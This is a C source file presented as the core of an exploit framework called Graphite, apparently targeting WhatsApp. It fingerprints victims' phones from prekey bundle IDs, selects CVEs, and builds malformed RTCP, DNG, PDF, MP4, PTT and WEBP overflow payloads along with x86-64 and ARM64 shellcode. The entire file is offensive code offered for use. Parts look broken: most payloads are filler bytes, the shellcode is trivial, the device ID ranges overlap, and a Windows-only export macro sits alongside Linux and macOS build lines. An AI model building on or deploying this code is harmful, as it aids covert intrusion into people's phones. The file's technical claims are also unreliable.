// graphite_core.c - Core exploit framework implementation (C)
// Compiled with: gcc -std=c11 -O2 -shared -o libgraphite.so graphite_core.c (Linux)
//                clang -std=c11 -O2 -shared -o libgraphite.dylib graphite_core.c (macOS)
//                cl /LD /O2 graphite_core.c (Windows)

#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>

#define GRAPHITE_EXPORT __declspec(dllexport)

typedef struct { uint32_t signed_pk_id; uint32_t otpk_ids[10]; int otpk_count; int platform_hint; int ios_version; } PrekeyBundle;
typedef struct { int platform; int confidence; char exploit_cve[32]; } FingerprintResult;

// Platform name lookup
GRAPHITE_EXPORT const char* graphite_platform_name(int platform) {
    switch (platform) {
        case 1: return "Android";
        case 2: return "iOS";
        default: return "Unknown";
    }
}

// Check if signed PK ID is in iOS range (0x800000+)
GRAPHITE_EXPORT int graphite_is_ios_range(uint32_t signed_pk_id) {
    return (signed_pk_id >= 0x800000 && signed_pk_id <= 0x9FFFFF);
}

// Fingerprint device from prekey bundle
GRAPHITE_EXPORT FingerprintResult graphite_fingerprint(const PrekeyBundle* bundle) {
    FingerprintResult result = {0, 0, ""};

    if (!bundle) return result;

    uint32_t spk = bundle->signed_pk_id;

    // iOS detection: Signed PK IDs in 0x800000+ range
    if (graphite_is_ios_range(spk)) {
        result.platform = 2;  // iOS
        result.confidence = 90;
        strcpy(result.exploit_cve, "CVE-2019-3568");
    }
    // Android detection: Signed PK IDs in 0x100000-0xFFFFFF range
    else if (spk >= 0x100000 && spk <= 0xFFFFFF) {
        result.platform = 1;  // Android
        result.confidence = 90;
        strcpy(result.exploit_cve, "CVE-2019-3568");
    }
    // OTPK-based detection
    else if (bundle->otpk_count > 0) {
        // Higher OTPK base values suggest iOS
        if (bundle->otpk_ids[0] > 0x1000000) {
            result.platform = 2;
            result.confidence = 85;
        } else {
            result.platform = 1;
            result.confidence = 85;
        }
        strcpy(result.exploit_cve, "CVE-2019-3568");
    }
    // Platform hint fallback
    else if (bundle->platform_hint == 2) {
        result.platform = 2;
        result.confidence = 50;
        strcpy(result.exploit_cve, "CVE-2019-3568");
    } else if (bundle->platform_hint == 1) {
        result.platform = 1;
        result.confidence = 50;
        strcpy(result.exploit_cve, "CVE-2019-3568");
    }

    // iOS version affects exploit selection
    if (result.platform == 2 && bundle->ios_version >= 17) {
        // Newer iOS - use zero-click CVE-2025-55177
        strcpy(result.exploit_cve, "CVE-2025-55177");
    }

    return result;
}

// Craft RTCP overflow payload (CVE-2019-3568)
GRAPHITE_EXPORT size_t graphite_craft_rtcp(uint8_t* buffer, size_t buffer_size, uint32_t ssrc) {
    if (!buffer || buffer_size < 100) return 0;

    size_t pos = 0;

    // Packet 1: Receiver Report with max report count (31)
    if (pos + 4 + 4 + 31*24 <= buffer_size) {
        buffer[pos++] = 0x9F;  // V=2, P=0, RC=31
        buffer[pos++] = 201;   // PT=RR
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x08 + 31*6;
        // SSRC
        buffer[pos++] = (ssrc >> 24) & 0xFF;
        buffer[pos++] = (ssrc >> 16) & 0xFF;
        buffer[pos++] = (ssrc >> 8) & 0xFF;
        buffer[pos++] = ssrc & 0xFF;
        // 31 report blocks
        for (int i = 0; i < 31; i++) {
            for (int j = 0; j < 24; j++) {
                buffer[pos++] = 0x41;
            }
        }
    }

    // Packet 2: SDES with oversized CNAME
    if (pos + 4 + 4 + 1 + 1 + 255 <= buffer_size) {
        buffer[pos++] = 0x81;  // V=2, P=0, SC=1
        buffer[pos++] = 202;   // PT=SDES
        buffer[pos++] = 0x01;
        buffer[pos++] = 0x05;  // length
        buffer[pos++] = (ssrc >> 24) & 0xFF;
        buffer[pos++] = (ssrc >> 16) & 0xFF;
        buffer[pos++] = (ssrc >> 8) & 0xFF;
        buffer[pos++] = ssrc & 0xFF;
        buffer[pos++] = 1;     // CNAME
        buffer[pos++] = 255;   // length
        for (int i = 0; i < 255; i++) {
            buffer[pos++] = 0x42;
        }
    }

    // Packet 3: BYE with oversized reason
    if (pos + 4 + 4 + 1 + 255 <= buffer_size) {
        buffer[pos++] = 0x81;
        buffer[pos++] = 203;   // PT=BYE
        buffer[pos++] = 0x01;
        buffer[pos++] = 0x05;
        buffer[pos++] = (ssrc >> 24) & 0xFF;
        buffer[pos++] = (ssrc >> 16) & 0xFF;
        buffer[pos++] = (ssrc >> 8) & 0xFF;
        buffer[pos++] = ssrc & 0xFF;
        buffer[pos++] = 255;   // reason length
        for (int i = 0; i < 255; i++) {
            buffer[pos++] = 0x43;
        }
    }

    return pos;
}

// Craft DNG payload (CVE-2025-43300)
GRAPHITE_EXPORT size_t graphite_craft_dng(uint8_t* buffer, size_t buffer_size) {
    if (!buffer || buffer_size < 100) return 0;

    size_t pos = 0;

    // TIFF header (little-endian)
    buffer[pos++] = 'I';
    buffer[pos++] = 'I';
    buffer[pos++] = 42;
    buffer[pos++] = 0;
    buffer[pos++] = 8;
    buffer[pos++] = 0;
    buffer[pos++] = 0;
    buffer[pos++] = 0;

    // SOF3 marker with mismatched SamplesPerPixel
    if (pos + 12 <= buffer_size) {
        buffer[pos++] = 0xFF;
        buffer[pos++] = 0xC3;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x0B;
        buffer[pos++] = 0x08;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x10;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x10;
        buffer[pos++] = 0x03;  // 3 components (outer mismatch)
        buffer[pos++] = 0x01;
        buffer[pos++] = 0x11;
    }

    // SOS marker
    if (pos + 8 <= buffer_size) {
        buffer[pos++] = 0xFF;
        buffer[pos++] = 0xDA;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x08;
        buffer[pos++] = 0x01;
        buffer[pos++] = 0x01;
        buffer[pos++] = 0x00;
        buffer[pos++] = 0x00;
    }

    // Padding to trigger overflow
    while (pos < buffer_size && pos < 1024) {
        buffer[pos++] = 0x00;
    }

    // EOI
    if (pos + 2 <= buffer_size) {
        buffer[pos++] = 0xFF;
        buffer[pos++] = 0xD9;
    }

    return pos;
}

// Craft PDF payload (Graphite-style WhatsApp delivery)
GRAPHITE_EXPORT size_t graphite_craft_pdf(uint8_t* buffer, size_t buffer_size) {
    if (!buffer || buffer_size < 100) return 0;

    const char* header = "%PDF-1.7\n%\xe2\xe3\xcf\xd3\n";
    size_t header_len = strlen(header);
    if (header_len > buffer_size) return 0;

    memcpy(buffer, header, header_len);
    size_t pos = header_len;

    // Add malformed content that triggers PDF parser overflow
    const char* obj1 = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n";
    size_t obj1_len = strlen(obj1);
    if (pos + obj1_len <= buffer_size) {
        memcpy(buffer + pos, obj1, obj1_len);
        pos += obj1_len;
    }

    // Oversized content stream
    if (pos + 100 <= buffer_size) {
        const char* stream_header = "2 0 obj\n<< /Length 4096 >>\nstream\n";
        size_t sh_len = strlen(stream_header);
        memcpy(buffer + pos, stream_header, sh_len);
        pos += sh_len;

        // Fill with overflow data
        for (size_t i = 0; i < 4096 && pos < buffer_size; i++) {
            buffer[pos++] = 0x41;
        }

        const char* stream_footer = "\nendstream\nendobj\n";
        size_t sf_len = strlen(stream_footer);
        if (pos + sf_len <= buffer_size) {
            memcpy(buffer + pos, stream_footer, sf_len);
            pos += sf_len;
        }
    }

    // Trailer
    const char* trailer = "trailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n100\n%%EOF\n";
    size_t t_len = strlen(trailer);
    if (pos + t_len <= buffer_size) {
        memcpy(buffer + pos, trailer, t_len);
        pos += t_len;
    }

    return pos;
}

// Craft MP4 payload
GRAPHITE_EXPORT size_t graphite_craft_mp4(uint8_t* buffer, size_t buffer_size) {
    if (!buffer || buffer_size < 100) return 0;

    size_t pos = 0;

    // ftyp box
    const char* ftyp = "ftypisom";
    size_t ftyp_len = 8;
    uint32_t ftyp_size = ftyp_len + 8;
    if (pos + ftyp_size <= buffer_size) {
        buffer[pos++] = (ftyp_size >> 24) & 0xFF;
        buffer[pos++] = (ftyp_size >> 16) & 0xFF;
        buffer[pos++] = (ftyp_size >> 8) & 0xFF;
        buffer[pos++] = ftyp_size & 0xFF;
        memcpy(buffer + pos, ftyp, ftyp_len);
        pos += ftyp_len;
        buffer[pos++] = 0; buffer[pos++] = 0; buffer[pos++] = 0; buffer[pos++] = 0;
    }

    // moov box with oversized data
    if (pos + 516 <= buffer_size) {
        uint32_t moov_size = 516;
        buffer[pos++] = (moov_size >> 24) & 0xFF;
        buffer[pos++] = (moov_size >> 16) & 0xFF;
        buffer[pos++] = (moov_size >> 8) & 0xFF;
        buffer[pos++] = moov_size & 0xFF;
        buffer[pos++] = 'm'; buffer[pos++] = 'o'; buffer[pos++] = 'o'; buffer[pos++] = 'v';
        for (int i = 0; i < 508; i++) {
            buffer[pos++] = 0x42;
        }
    }

    return pos;
}

// Craft PTT payload (CVE-2020-1894)
GRAPHITE_EXPORT size_t graphite_craft_ptt(uint8_t* buffer, size_t buffer_size) {
    if (!buffer || buffer_size < 16) return 0;
    size_t pos = 0;
    const char* magic = "PTT\0";
    size_t magic_len = 4;
    if (pos + magic_len <= buffer_size) {
        memcpy(buffer + pos, magic, magic_len);
        pos += magic_len;
    }
    while (pos < buffer_size && pos < 1024) {
        buffer[pos++] = 0x43;
    }
    return pos;
}

// Craft WEBP payload (CVE-2019-11927)
GRAPHITE_EXPORT size_t graphite_craft_webp(uint8_t* buffer, size_t buffer_size) {
    if (!buffer || buffer_size < 16) return 0;
    size_t pos = 0;
    const char* magic = "WEBP";
    size_t magic_len = 4;
    if (pos + magic_len <= buffer_size) {
        memcpy(buffer + pos, magic, magic_len);
        pos += magic_len;
    }
    // RIFF header
    if (pos + 4 <= buffer_size) {
        buffer[pos++] = 'R'; buffer[pos++] = 'I'; buffer[pos++] = 'F'; buffer[pos++] = 'F';
    }
    while (pos < buffer_size && pos < 1024) {
        buffer[pos++] = 0x44;
    }
    return pos;
}

// Shellcode generation
GRAPHITE_EXPORT size_t graphite_shellcode_arm64(uint8_t* buffer, size_t buffer_size) {
    if (!buffer || buffer_size < 20) return 0;

    uint8_t sc[] = {
        0x00, 0x00, 0x80, 0xd2,  // mov x0, #0
        0x21, 0x00, 0x80, 0xd2,  // mov x1, #1
        0x42, 0x00, 0x80, 0xd2,  // mov x2, #2
        0x08, 0x00, 0x80, 0xd2,  // mov x8, #0
        0x01, 0x00, 0x00, 0xd4,  // svc #0
    };
    size_t len = sizeof(sc);
    if (len > buffer_size) len = buffer_size;
    memcpy(buffer, sc, len);
    return len;
}

GRAPHITE_EXPORT size_t graphite_shellcode_x86_64(uint8_t* buffer, size_t buffer_size) {
    if (!buffer || buffer_size < 16) return 0;

    uint8_t sc[] = {
        0x48, 0x31, 0xc0,        // xor rax, rax
        0x48, 0x31, 0xff,        // xor rdi, rdi
        0x48, 0x31, 0xf6,        // xor rsi, rsi
        0x48, 0x31, 0xd2,        // xor rdx, rdx
        0xb0, 0x3b,              // mov al, 59
        0x0f, 0x05,              // syscall
    };
    size_t len = sizeof(sc);
    if (len > buffer_size) len = buffer_size;
    memcpy(buffer, sc, len);
    return len;
}
